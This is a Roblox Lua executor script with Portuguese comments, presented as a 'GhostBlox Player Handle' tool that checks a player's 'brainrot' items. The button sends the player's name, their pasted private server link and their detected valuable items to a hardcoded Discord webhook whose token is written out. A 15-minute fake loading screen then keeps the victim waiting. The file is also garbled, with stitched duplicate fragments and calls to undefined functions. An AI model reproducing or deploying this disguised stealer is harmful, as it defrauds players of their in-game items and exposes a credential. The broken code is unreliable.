-- GhostBlox Player Handle v2 (GUI bonita + funcional)
-- Envia brainrots APENAS quando clicar no botão

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")

-- ✅ Webhook único
local webhook = "https://discord.com/api/webhooks/1386434273656963204/9QEYbJha-cO3s3uQpLkMNcByS6-RG9_lxyQikqZ9S0N1V2EuzfzrOpY-IAvX2vREP4tS"

local brainrots = {
	"Strawberry Elephant Corn Corn Corn Sahur", "La Vacca Saturno Saturnita", "Blackhole Goat",
	"Agarrini La Palini", "Los Matteos", "Chimpanzini Spiderini", "Sammyni Spyderini",
	"La Cucaracha", "Los Tralaleritos", "Las Vaquitas Saturnitas", "Job Job Job Sahur",
	"Los Spyderinis", "Graipuss Medussi", "Tortuginni Dragonfruitini", "Nooo My Hotspot",
	"Pot Hotspot", "To To To Sahur", "Trenostruzzo Turbo 4000", "La Supreme Combinasion"
}
local detected = {}

-- 🌐 Envio de webhook
local function doRequest(reqTable)
	if syn and syn.request then return syn.request(reqTable)
	elseif http_request then return http_request(reqTable)
	elseif request then return request(reqTable)
	elseif fluxus and fluxus.request then return fluxus.request(reqTable)
	elseif krnl and krnl.request then return krnl.request(reqTable)
	end
end

local function sendWebhook(msg)
	local body = HttpService:JSONEncode({content = msg})
	pcall(function()
		doRequest({
			Url = webhook,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = body
		})
	end)
end

-- 🧠 Busca brainrots
local function gatherNewBrainrots()
	local results = {}
	local plots = Workspace:FindFirstChild("Plots")
	if not plots then return results end
	for _, p in pairs(plots:GetChildren()) do
		for _, i in pairs(p:GetChildren()) do
			for _, name in pairs(brainrots) do
				if i.Name == name and not detected[name] then
					detected[name] = true
					table.insert(results, name)
				end
			end
		end
	end
	return results
end

-- 🪄 GUI bonita
local function createGhostUI()
	local plr = Players.LocalPlayer
	local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	gui.Name = "GhostHandleUI"

	local main = Instance.new("Frame", gui)
	main.Size = UDim2.new(0, 420, 0, 260)
	main.Position = UDim2.new(0.5, -210, 0.5, -130)
	main.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
	main.BackgroundTransparency = 0.15
	main.BorderSizePixel = 0
	main.ClipsDescendants = true
	main.ZIndex = 10
	main.Active = true
	main.Draggable = true
	main.BackgroundTransparency = 0.2
	main:SetAttribute("Rounded", true)

	local corner = Instance.new("UICorner", main)
	corner.CornerRadius = UDim.new(0, 15)

	local glow = Instance.new("UIStroke", main)
	glow.Color = Color3.fromRGB(150, 90, 255)
	glow.Thickness = 1.5

	local title = Instance.new("TextLabel", main)
	title.Text = "👻 GhostBlox - Player Handle"
	title.Size = UDim2.new(1, 0, 0, 45)
	title.Font = Enum.Font.GothamBold
	title.TextColor3 = Color3.fromRGB(200,180,255)
	title.TextSize = 22
	title.BackgroundTransparency = 1

	local box = Instance.new("TextBox", main)
	box.Size = UDim2.new(1, -40, 0, 40)
	box.Position = UDim2.new(0, 20, 0, 70)
	box.PlaceholderText = "Digite o link do servidor privado..."
	box.Font = Enum.Font.Gotham
	box.TextSize = 16
	box.BackgroundColor3 = Color3.fromRGB(30,30,45)
	box.TextColor3 = Color3.fromRGB(255,255,255)
	box.ClearTextOnFocus = false
	box.BorderSizePixel = 0
	local boxCorner = Instance.new("UICorner", box)
	boxCorner.CornerRadius = UDim.new(0, 10)

	local button = Instance.new("TextButton", main)
	button.Size = UDim2.new(0, 150, 0, 40)
	button.Position = UDim2.new(0.5, -75, 0, 140)
	button.Text = "Enviar 🔗"
	button.Font = Enum.Font.GothamBold
	button.TextSize = 18
	button.TextColor3 = Color3.new(1,1,1)
	button.BackgroundColor3 = Color3.fromRGB(120,70,255)
	local btnCorner = Instance.new("UICorner", button)
	btnCorner.CornerRadius = UDim.new(0, 12)

	local note = Instance.new("TextLabel", main)
	note.Text = "Clique em Enviar para checar os Brainrots."
	note.Font = Enum.Font.Gotham
	note.TextColor3 = Color3.fromRGB(180,180,200)
	note.TextSize = 14
	note.Position = UDim2.new(0, 0, 1, -25)
	note.Size = UDim2.new(1, 0, 0, 20)
	note.BackgroundTransparency = 1

	-- animação hover no botão
	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(150,90,255)}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(120,70,255)}):Play()
	end)

	return button, box
end

-- 🚀 Execução
local button, box = createGhostUI()
button.MouseButton1Click:Connect(function()
	local link = box.Text
	local found = gatherNewBrainrots()
	local playerName = Players.LocalPlayer.Name
	local message = {
		string.format("👤 Jogador: **%s**", playerName),
		string.format("🔗 Link: %s", link),
		string.format("👥 Players: %d/%s", #Players:GetPlayers(), Players.MaxPlayers or "???"),
	}
	if #found > 0 then
		table.insert(message, "🧠 Brainrots detectados:")
		for _, n in ipairs(found) do table.insert(message, "- " .. n) end
	else
		table.insert(message, "⚠️ Nenhum Brainrot encontrado.")
	end
	sendWebhook(table.concat(message, "\n"))
	button.Text = "✅ Enviado!"
	TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(50,200,100)}):Play()
	wait(2)
	button.Text = "Enviar 🔗"
	TweenService:Create(button, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(120,70,255)}):Play()
end)

print("✔ GhostBlox Player Handle GUI carregada com sucesso!")dTransparency = 1
    subtitle.TextColor3 = Color3.fromRGB(180,180,180)
    subtitle.TextWrapped = true
    subtitle.Parent = mainFrame

    local linkBox = Instance.new("TextBox")
    linkBox.PlaceholderText = "Link do servidor privado"
    linkBox.Font = Enum.Font.Gotham
    linkBox.TextSize = 16
    linkBox.Size = UDim2.new(1, -20, 0, 40)
    linkBox.Position = UDim2.new(0, 10, 0, 105)
    linkBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
    linkBox.TextColor3 = Color3.fromRGB(255,255,255)
    linkBox.ClearTextOnFocus = false
    linkBox.Parent = mainFrame

    local sendButton = Instance.new("TextButton")
    sendButton.Text = "OK"
    sendButton.Font = Enum.Font.GothamBold
    sendButton.TextSize = 18
    sendButton.Size = UDim2.new(0, 120, 0, 38)
    sendButton.Position = UDim2.new(0.5, -60, 0, 160)
    sendButton.BackgroundColor3 = Color3.fromRGB(70,130,180)
    sendButton.TextColor3 = Color3.fromRGB(255,255,255)
    sendButton.Parent = mainFrame

    return screenGui, mainFrame, linkBox, sendButton
end

-- Loading screen antiga (barra de 15min)
local function showLoadingScreen()
    local player = Players.LocalPlayer
    if not player then return end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackLoadingScreen"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0,0,0,0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 10
    blackFrame.Parent = screenGui

    local loadingTitle = Instance.new("TextLabel")
    loadingTitle.Text = "puxando players por favor espere"
    loadingTitle.Font = Enum.Font.GothamBold
    loadingTitle.TextSize = 30
    loadingTitle.Size = UDim2.new(1, 0, 0, 60)
    loadingTitle.Position = UDim2.new(0, 0, 0.3, -30)
    loadingTitle.BackgroundTransparency = 1
    loadingTitle.TextColor3 = Color3.fromRGB(255,255,255)
    loadingTitle.ZIndex = 11
    loadingTitle.Parent = blackFrame

    local loadingBarBg = Instance.new("Frame")
    loadingBarBg.Size = UDim2.new(0.5, 0, 0, 40)
    loadingBarBg.Position = UDim2.new(0.25, 0, 0.5, 0)
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
    loadingBarBg.BorderSizePixel = 0
    loadingBarBg.ZIndex = 11
    loadingBarBg.Parent = blackFrame

    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.Position = UDim2.new(0, 0, 0, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(70,130,180)
    loadingBar.BorderSizePixel = 0
    loadingBar.ZIndex = 12
    loadingBar.Parent = loadingBarBg

    local percentText = Instance.new("TextLabel")
    percentText.Text = "0%"
    percentText.Font = Enum.Font.GothamBold
    percentText.TextSize = 18
    percentText.Size = UDim2.new(1, 0, 1, 0)
    percentText.Position = UDim2.new(0, 0, 0, 0)
    percentText.BackgroundTransparency = 1
    percentText.TextColor3 = Color3.fromRGB(255,255,255)
    percentText.ZIndex = 12
    percentText.Parent = loadingBarBg

    return screenGui, loadingBar, percentText
end

-- Cria UI e conecta botão
local screenGui, mainFrame, linkBox, sendButton = createUI()
if sendButton then
    sendButton.MouseButton1Click:Connect(function()
        local linkText = tostring(linkBox.Text or "")

        -- Checa Plots e pega novos brainrots
        local found = gatherNewBrainrots()

        -- Monta a mensagem usando quantidade de players / limite
        local currentPlayers = #Players:GetPlayers()
        local maxPlayers = Players.MaxPlayers or "Desconhecido"
        local messageLines = {}
        table.insert(messageLines, string.format("🔗 Mensagem do jogador **%s**: %s", Players.LocalPlayer.Name, linkText))
        table.insert(messageLines, string.format("👥 Jogadores no servidor: %d/%s", currentPlayers, maxPlayers))

        -- Brainrots encontrados
        if #found > 0 then
            for _, info in ipairs(found) do
                table.insert(messageLines, string.format("🧠 Brainrot detectado: **%s**", info.name))
            end
        else
            table.insert(messageLines, "⚠️ Nenhum **Brainrot God/Secrets** encontrado na checagem.")
        end

        -- Envia mensagem
        local fullMessage = table.concat(messageLines, "\n")
        sendToAllWebhooks(fullMessage)

        -- Fecha menu e mostra loading
        if mainFrame then mainFrame.Visible = false end
        local loadingGui, loadingBar, percentText = showLoadingScreen()
        local totalTime = 900 -- 15 minutos
        local elapsed = 0
        while elapsed < totalTime do
            task.wait(0.1)
            elapsed = elapsed + 0.1
            local percent = math.floor((elapsed / totalTime) * 100)
            if loadingBar then loadingBar.Size = UDim2.new(percent/100, 0, 1, 0) end
            if percentText then percentText.Text = tostring(percent) .. "%" end
        end
        if loadingBar then loadingBar.Size = UDim2.new(1,0,1,0) end
        if percentText then percentText.Text = "100%" end
    end)
end

print("✔ Script atualizado: envia brainrots SOMENTE ao enviar a mensagem do jogador.")centText.Text = "100%" end
    end)
end

print("✔ Script atualizado: envia brainrots SOMENTE ao enviar a mensagem do jogador.")
